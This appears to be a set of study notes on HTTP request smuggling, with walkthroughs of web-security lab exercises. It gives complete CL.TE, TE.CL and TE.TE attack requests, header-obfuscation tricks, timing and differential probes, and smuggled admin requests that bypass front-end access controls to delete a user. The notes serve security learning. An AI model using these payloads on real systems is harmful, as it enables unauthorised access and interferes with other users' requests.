### Http req smuggling
When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection
HTTP requests are sent one after another, and the receiving server has to determine where one request ends and the next one begins

It is crucial that the front-end and back-end systems agree about the boundaries between requests. Otherwise, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems

The attacker causes part of their front-end request to be interpreted by the back-end server as the start of the next request. It is effectively prepended to the next request, and so can interfere with the way the application processes that request. This is a request smuggling attack, and it can have devastating results

### How do HTTP request smuggling vulnerabilities arise?
Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.

The Content-Length header is straightforward: it specifies the length of the message body in bytes. For example:
```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a **chunk of size zero**. For example:
```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

> Note:  
> Many security testers are unaware that chunked encoding can be used in HTTP requests, for two reasons:
> - Burp Suite automatically unpacks chunked encoding to make messages easier to view and edit.
> - Browsers do not normally use chunked encoding in requests, and it is normally seen only in server responses.

As the HTTP/1 specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other. The specification attempts to prevent this problem by stating that if both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored. This might be sufficient to avoid ambiguity when only a single server is in play, but not when two or more servers are chained together. In this situation, problems can arise for two reasons:
- Some servers do not support the Transfer-Encoding header in requests.
- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.
If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) Transfer-Encoding header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.

> Note:  
> Websites that use HTTP/2 end-to-end are inherently immune to request smuggling attacks. As the HTTP/2 specification introduces a single, robust mechanism for specifying the length of a request, there is no way for an attacker to introduce the required ambiguity.  
> However, many websites have an HTTP/2-speaking front-end server, but deploy this in front of back-end infrastructure that only supports HTTP/1. This means that the front-end effectively has to translate the requests it receives into HTTP/1. This process is known as HTTP downgrading. For more information, see Advanced request smuggling.

### How to perform an HTTP request smuggling attack
Classic request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:
- CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
- TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
- TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

> Note  
> These techniques are only possible using HTTP/1 requests. Browsers and other clients, including Burp, use HTTP/2 by default to communicate with servers that explicitly advertise support for it during the TLS handshake.  
> As a result, when testing sites with HTTP/2 support, you need to manually switch protocols in Burp Repeater. You can do this from the Request attributes section of the Inspector panel.

### CL.TE vulnerabilities
Here, the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. We can perform a simple HTTP request smuggling attack as follows
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
The front-end server processes the Content-Length header and determines that the request body is 13 bytes long, up to the end of SMUGGLED. This request is forwarded on to the back-end server.

The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following bytes, SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

### PRACTITIONER Lab: HTTP request smuggling, basic CL.TE vulnerability
> Note: enable non printable characters in burp before attemptimg this lab

To test the backend servers for CL.TE send the following payload:
```
POST / HTTP/1.1
Host: ff.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
X
```
We get 500 Internal Server Error and the msg: "Server Error: Communication timed out"
It happens because the frontend server used Content-Length header and assumed that `abc` is the end of the req.body and so it sent that req.body that ends with `abc` to the backend server.
The backend server used Transfer-Encoding header which means `3` represents the chunk size (and the chunk is `abc`) but the next chunk size is absent. (If it was the last chunk size then instead of `3` we'd specify `0`)
And since the next chunk size and next chunk are missing it could not finish processing the req, so it throwed 500 error and err: Timed out.

#### Solution to the lab:
Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
G
```
The second response responded: "Unrecognized method GPOST"

This happens because the frontend server processes the Content-Length header and determines that the request body is 6 bytes long, up to the end of `G`. This request is forwarded on to the back-end server.

The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following byte (`G`), is left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.
That's why the second response responded: "Unrecognized method GPOST"

### TE.CL vulnerabilities
### About `Transfer-Encoding: chunked` (from MDN): 
Data is sent in a series of chunks. The Content-Length header is omitted in this case and at the beginning of each chunk you need to add the length of the current chunk in hexadecimal format, followed by '\r\n' and then the chunk itself, followed by another '\r\n'. The terminating chunk is a regular chunk, with the exception that its length is zero. It is followed by the trailer, which consists of a (possibly empty) sequence of header fields. 

### PRACTITIONER Lab: HTTP request smuggling, basic TE.CL vulnerability
Please note:
The valid ending of the req that is parsed by `Transfer-Encoding: chunked` must be: `0\r\n\r\n`
Otherwise we're getting `Read timeout` err

To test for TE.CL send the following req:
```
POST / HTTP/1.1
Host: ff.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
X\r\n
```
As the response we get: 400 Bad Request, {"error":"Invalid request"}
It happens because the frontend server uses Transfer-Encoding header and therefore reads the first chunk (`abc` that has length of 3 bytes) and then it expects the size of the next chunk but instead it gets `X\r\n` which is invalid hex number and therefore it throw an err: 400 Bad request.

We can also check that backend server is using Content-Length header with the following req:
```
POST / HTTP/1.1
Host: ff.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
X
```
The response will be: 500 Internal Server Error, Communication timed out 
Because the frontend server parsed `0` as chunk size and therefore truncated everything after it (in this case `X` was truncated).
And when the backend server received Content-Length of 6 but the actual length of the body was 5 (`0\r\n\r\n` without `X`) - So the backend server will wait for the sixth byte to arrive until it times out and throws an err 

To solve the lab we need to smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`

So we send the following req twice:
```bash
POST / HTTP/1.1
Host: ff.web-security-academy.net
Content-Length: 3
Transfer-Encoding: chunked
\r\n
1\r\n
G\r\n
0\r\n
\r\n
```
First response is 200 and the second response: "Unrecognized method G0POST"
Looks good, but the lab requires `GPOST` and we got `G0POST`

We can't just remove `0` from the end because `0\r\n\r\n` is the valid ending of `Transfer-Encoding: chunked` 
If we remove it we'll get a `Read timeout` because the frontend server still expects the valid ending of the req body (which is `0\r\n\r\n`)

#### Detailed explanation:
For the sake of explanation clarity let's now have 2 separate requests:
Normal req:
```bash
POST / HTTP/1.1
Host: ff.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Attack req:
```bash
POST / HTTP/1.1
Host: ff.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
\r\n
56\r\n
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
\r\n
0\r\n
\r\n
```

First we send the `Attack req` and get back 200 OK response
Immediately after it we send `Normal req` and we get: "Unrecognized method GPOST"

So here's how it works:
When we first send `Attack req` the frontend server uses `Transfer-Encoding: chunked` for req parsing and therefore sends the whole `Attack req` to the backend server

The backend server only cares about `Content-Length` header
It first reads: `Content-Length: 4` and therefore ends processing of the req at `56\r\n` and so the remained part:
```bash
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
\r\n
0\r\n
\r\n
```
poisons the server.

When the `Normal req` is sent to the backend server, the backend server first processes the poisoned (`GPOST`) req 

Since the `Content-Length` in the `GPOST` req is equal to `6` and the actual length of the req body is `5`, the req processing can not be finished and it still waits for 1 more byte to arrive.

Since one more byte is needed - it steals (or smuggles if you will) the first byte of the `Normal req` and the req body processing is done.
It then figures out that the req method (`GPOST`) does not exist and therefore it throws the err: "Unrecognized method GPOST" 

> Note:
If we change the `Content-Length` in the `GPOST` req from `6` to `5`
```bash
POST / HTTP/1.1
Host: 0aff00e8044387e48367ab0100c100d8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
\r\n
56\r\n
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
\r\n
0\r\n
\r\n
```
And then send `Attack req` and `Normal req` after it, from the server we'll get both 200 OK responses.

It happens because `5` is the actual length of the req body of the `GPOST` req.
Server will successfully process the req body of the `GPOST` req and then will check that `GPOST` http method does not exist and it will throw an err, but we won't see that err. It'll happen in the background.

In other words `Attack req` will get 200 OK, response.
Then `GPOST` req will fail behind the scenes
And `Normal req` will also get 200 OK.
And therefore we'll see 200 OK twice.

BTW: to test that the `GPOST` req fails in the background, instead of the `GPOST` req we can send a req that posts a comment. And if the comment is posted - then the request was executed in the background.

Example of an `Attack req` that posts a comment:
```bash
POST / HTTP/1.1
Host: 0a2100b704ce958f805bd1ce00350016.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Transfer-Encoding: chunked
 
143
POST /post/comment HTTP/1.1
Host: 0a2100b704ce958f805bd1ce00350016.web-security-academy.net
Cookie: session=3HLsDdzUYgzPQ2kQavc6Unl87DZy5nz9
Content-Length: 114
Content-Type: application/x-www-form-urlencoded
 
csrf=no436u5Fc1ZrQd1kaVlYUje5LkkTQM7H&postId=6&name=x&email=x%40x.com&website=https%3A%2F%2Fx.com&comment=y
0
```

### TE.TE behavior: obfuscating the TE header
Here, the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

There are potentially endless ways to obfuscate the Transfer-Encoding header. For example: 
```bash
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

Each of these techniques involves a subtle departure from the HTTP specification. Real-world code that implements a protocol specification rarely adheres to it with absolute precision, and it is common for different implementations to tolerate different variations from the specification. To uncover a TE.TE vulnerability, it is necessary to find some variation of the Transfer-Encoding header such that only one of the front-end or back-end servers processes it, while the other server ignores it

Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated Transfer-Encoding header, the remainder of the attack will take the same form as for the CL.TE or TE.CL vulnerabilities already described

### PRACTITIONER Lab: HTTP request smuggling, obfuscating the TE header
First we need to determine what the frontend server is using, TE or CL

We send the req:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
X\r\n
```
Response 404 bad request and in the body:
```bash
{"error": "invalid request"}
```
This indicates that the frontend is using TE

So we try to determine what the backend is using by sending the req:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
X
```
We get 200 OK, which means the backend is using TE as well

So we want to obfuscate TE header so that one of the servers falls back to processing CL header instead
There are different techniques for TE obfuscation, right now we're using double TE header: when the second TE header has an invalid value

So we try the following req:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: foobar
\r\n
0\r\n
\r\n
X
```
And we see that the response is now timing out
It happens because the frontend actually accepted the first TE header `Transfer-Encoding: chunked` and then the backend server tried to process `Transfer-Encoding: foobar` but failed and started using CL header instead

So we now prepare 2 requests, normal and attack requests:
Normal:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
\r\n
foo=bar
```

Attack:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked
Transfer-Encoding: foobar
\r\n
1\r\n
G\r\n
0\r\n
\r\n
```

So we send the attack req and the backend used CL header and therefore the backend is now poisoned with `G\r\n0\r\n\r\n`
And now we send a normal req and we see: 403 Forbidden: Unrecognized method G0POST

So now all we need to do is to change G0POST to GPOST to solve the lab

Final attack req:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: foobar
\r\n
5c\r\n
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
\r\n
x=1\r\n
0\r\n
\r\n
```

`5c` is a hex value which indicates the length of the subsequent chunk, which is everything starting from GPOST up until but not including `\r\n0\r\n\r\n`

And normal req:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
\r\n
foo=bar
```

So now we send our attack req, and normal req
and we get back: Unrecognized method GPOST

In burp don't forget to downgrage to http1: Inspector > req attributes > http1
And also in burp disable Update content length

### Finding HTTP request smuggling vulnerabilities
### Finding HTTP request smuggling vulnerabilities using timing techniques
### Finding CL.TE vulnerabilities using timing techniques
If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay:
```bash
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
Since the front-end server uses the Content-Length header, it will forward only part of this request, omitting the X. The back-end server uses the Transfer-Encoding header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay. 

### Finding TE.CL vulnerabilities using timing techniques
If an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the following will often cause a time delay:
```bash
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

Since the front-end server uses the Transfer-Encoding header, it will forward only part of this request, omitting the X. The back-end server uses the Content-Length header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay. 

> Note:
>
> The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.

### Confirming HTTP request smuggling vulnerabilities using differential responses
When a probable request smuggling vulnerability has been detected, you can obtain further evidence for the vulnerability by exploiting it to trigger differences in the contents of the application's responses. This involves sending two requests to the application in quick succession:
- An "attack" request that is designed to interfere with the processing of the next request.
- A "normal" request.

If the response to the normal request contains the expected interference, then the vulnerability is confirmed

For example, suppose the normal request looks like this:
```bash
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```
This request normally receives an HTTP response with status code 200, containing some search results.

The attack request that is needed to interfere with this request depends on the variant of request smuggling that is present: CL.TE vs TE.CL. 

### Confirming CL.TE vulnerabilities using differential responses
To confirm a CL.TE vulnerability, you would send an attack request like this:
```bash
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:
```bash
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```
Since this request now contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it

### PRACTITIONER Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
Let's first try:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
X\r\n
```
When we send that request we don't get a response right away and eventually it times out
This is a strong indication that the frontend server is using CL and the backend is using TE 

To confirm CL TE, we'll use differential responses:
The attack req:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /whateverDoesntExist HTTP/1.1\r\n
X-Ignore: X
```
**Make sure there is no `\r\n` after `X-Ignore: X` because we want our normal request to be prepended without `\r\n`, i.e. we want it to be right after the `X` e.g.:**
Example of how it'll be handled on the backend:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /whateverDoesntExist HTTP/1.1\r\n
X-Ignore: XGET / HTTP/1.1
Host: ...
Cookie: ...
```

About X-Ignore header: the name of it is random, it does not matter what we call it

Normal req (copied from burp's http history and only http method is changed from http2 to http 1.1, everything else stays the same):
```bash
GET / HTTP/1.1
Host: 0a76000d0349cb86c626ea2c00750024.web-security-academy.net
Cookie: session=fWPKe4DIffrpGyMSi5Svw0DDTAf50WTV
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

If we send our normal req casually, we get 200 OK status
But if we first send our attack req and only after it we send normal req - we get 404 not found

### Confirming TE.CL vulnerabilities using differential responses
To confirm a TE.CL vulnerability, you would send an attack request like this:
```bash
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

> Note:
>
>  To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
> You need to include the trailing sequence \r\n\r\n following the final 0. 

If the attack is successful, then everything from GET /404 onwards is treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:
```bash
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```
Since this request now contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it

### PRACTITIONER Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
Let's first try:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
X\r\n
```
In the response we get 400 Bad request and the message: `Invalid req`
That's a strong indication that the frontend is using TE

Let's now find out what the backend is using:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
X
```
And we see that the response is timing out, because the backend got 5 bytes and it still waits for the sixth byte to arrive i.e. it uses CL. At least that's a strong indication that it does in fact use CL

So we try differential responses:
Attack req:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
\r\n
a8\r\n # a8 is a hex value of the chunk size (which includes everything up to x=1 but not \r\n after it)
POST /doesnotexist HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 15 # (Content length has to be 10+1 (+1 because we need at least 1 byte to be smuggled, i.e. it needs to be the body length +1 byte) but for fun we're gonna go with 15 here)
\r\n
x=1\r\n
0\r\n
\r\n
```

And our normal request (simple get req downgraded to http 1.1):
```bash
GET / HTTP/1.1
Host: 0a2500a1044892c7857450d100ae004e.web-security-academy.net
Cookie: session=qqN4H1FiVVaYJSG0XzwN9POXLh3X8q35
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

So we first send attack req and then we send normal req. And we get: 404 Not Found. This confirms TE.CL because If we send normal req without attack req, we get 200 OK 

> Note:
>
>  Some important considerations should be kept in mind when attempting to confirm request smuggling vulnerabilities via interference with other requests:
> - The "attack" request and the "normal" request should be sent to the server using different network connections. Sending both requests through the same connection won't prove that the vulnerability exists.
> - The "attack" request and the "normal" request should use the same URL and parameter names, as far as possible. This is because many modern applications route front-end requests to different back-end servers based on the URL and parameters. Using the same URL and parameters increases the chance that the requests will be processed by the same back-end server, which is essential for the attack to work.
> - When testing the "normal" request to detect any interference from the "attack" request, you are in a race with any other requests that the application is receiving at the same time, including those from other users. You should send the "normal" request immediately after the "attack" request. If the application is busy, you might need to perform multiple attempts to confirm the vulnerability.
> - In some applications, the front-end server functions as a load balancer, and forwards requests to different back-end systems according to some load balancing algorithm. If your "attack" and "normal" requests are forwarded to different back-end systems, then the attack will fail. This is an additional reason why you might need to try several times before a vulnerability can be confirmed.
> - If your attack succeeds in interfering with a subsequent request, but this wasn't the "normal" request that you sent to detect the interference, then this means that another application user was affected by your attack. If you continue performing the test, this could have a disruptive effect on other users, and you should exercise caution.

### Exploiting HTTP request smuggling vulnerabilities
### Using HTTP request smuggling to bypass front-end security controls
In some applications, the front-end web server is used to implement some security controls, deciding whether to allow individual requests to be processed. Allowed requests are forwarded to the back-end server, where they are deemed to have passed through the front-end controls.

For example, suppose an application uses the front-end server to implement access control restrictions, only forwarding requests if the user is authorized to access the requested URL. The back-end server then honors every request without further checking. In this situation, an HTTP request smuggling vulnerability can be used to bypass the access controls, by smuggling a request to a restricted URL.

Suppose the current user is permitted to access /home but not /admin. They can bypass this restriction using the following request smuggling attack:
```bash
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```
The front-end server sees two requests here, both for /home, and so the requests are forwarded to the back-end server. However, the back-end server sees one request for /home and one request for /admin. It assumes (as always) that the requests have passed through the front-end controls, and so grants access to the restricted URL

### PRACTITIONER Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
Lab description:
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos. 

#### Solution:
Norm req:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Attack req:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
0\r\n
\r\n
GET /jjjjjjjjjj HTTP/1.1\r\n
```

So now when we send the attack req and after it we send the normal req and we get back 400 Bad request with response: `Invalid request`
We get that invalid request because on the backend after the attack req is processed, the:
`GET /jjjjjjjjjj HTTP/1.1\r\n` part is still there and when norm req comes the server tries to process the following:
```bash
GET /jjjjjjjjjj HTTP/1.1\r\n
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
That's why we get invalid request

To fix that we change the attack req to the following:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
0\r\n
\r\n
GET /jjjjjjjjjj HTTP/1.1\r\n
Random: x
```
And later it will append norm req in the following way: 
```bash
GET /jjjjjjjjjj HTTP/1.1\r\n
Random: xPOST / HTTP/1.1\r\n
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
So `POST / HTTP/1.1\r\n is now part of the value of Random header and other headers like Host and potentially Cookie are used as part of our request (GET /jjj...)`
And we now send attack and norm requests and we get 404 Not found, which confirms that `GET /jjjjjjjjjj` was not found

So we change `/jjj...` to `/admin` and after attack, norm requests we get `401 Unauthorized`
So we modify the attack req again (we add `Host: localhost`):
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: localhost
Random: x
```

We then send attack, norm reqs and in response we get: `"error":"Duplicate header names are not allowed"`

It happens because when we send the norm req, the poisoned backend server will try to parse the following:
```bash
GET /jjjjjjjjjj HTTP/1.1
Host: localhost
Random: xPOST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
And as we can see there are 2 `Host` headers

So we now change the attack req again:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
0\r\n
\r\n
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
\r\n
x=
```

And now we send our attack, norm reqs and in the response to the norm req we actually get the html returned from `/admin` endpoint. It happens because `/admin` endpoint checks the `Host` header and if it is equal to localhost then it returns html

Part of the response includes:
```bash
<a href="/admin/delete?username=carlos">Delete</a>
```

So we change our attack req again:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
0\r\n
\r\n
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
\r\n
x=
```

Final explanation:
After the attack req is sent, the backend server is poisoned with:
```bash
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
\r\n
x=
```
But the response is not given because it expects 1 more byte to arrive (Content-Length: 3) so when we send norm req it actually takes the first byte from the norm req and finishes processing our poisoned req (`GET /admin/delete?username=carlos`) and sends the response to the one who made that norm req (in this case to us because we made that norm req)
The remainder of the norm req is invalid req because we don't see the response of it. It fails in the background.
```bash
OST / HTTP/1.1
Host: 0a7a00c80443862881fbb12700510041.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

### PRACTITIONER Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
Attack req:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
\r\n
2e\r\n
GET /doesntexist HTTP/1.1\r\n
Content-Length: 6\r\n
\r\n
0\r\n
\r\n
```

Norm req:
```bash
POST / HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
And we send attack, norm reqs and we get back: 404 Not found because there is no `GET /doesntexist` endpoint on the backend server

So we change the attack req: (we change the url to `/admin`)
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
\r\n
28\r\n
GET /admin HTTP/1.1\r\n
Content-Length: 6\r\n
\r\n
0\r\n
\r\n
```

And we send attack, norm reqs and we get back Unauthorized, so we add Host: localhost and change the chunk size to 0x39
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
\r\n
39\r\n
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
Content-Length: 6\r\n
\r\n
0\r\n
\r\n
```

And we got our admin page with the option to delete users, so we now craft the final attack req:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
\r\n
50\r\n
GET /admin/delete?username=carlos HTTP/1.1\r\n
Host: localhost\r\n
Content-Length: 6\r\n
\r\n
0\r\n
\r\n
```

### Revealing front-end request rewriting
In many applications, the front-end server performs some rewriting of requests before they are forwarded to the back-end server, typically by adding some additional request headers. For example, the front-end server might:
- terminate the TLS connection and add some headers describing the protocol and ciphers that were used;
- add an X-Forwarded-For header containing the user's IP address;
- determine the user's ID based on their session token and add a header identifying the user; or
- add some sensitive information that is of interest for other attacks.

In some situations, if your smuggled requests are missing some headers that are normally added by the front-end server, then the back-end server might not process the requests in the normal way, resulting in smuggled requests failing to have the intended effects.

There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:
- Find a POST request that reflects the value of a request parameter into the application's response.
- Shuffle the parameters so that the reflected parameter appears last in the message body.
- Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.

Suppose an application has a login function that reflects the value of the email parameter:
```bash
POST /login HTTP/1.1
Host: vulnerable-website.com
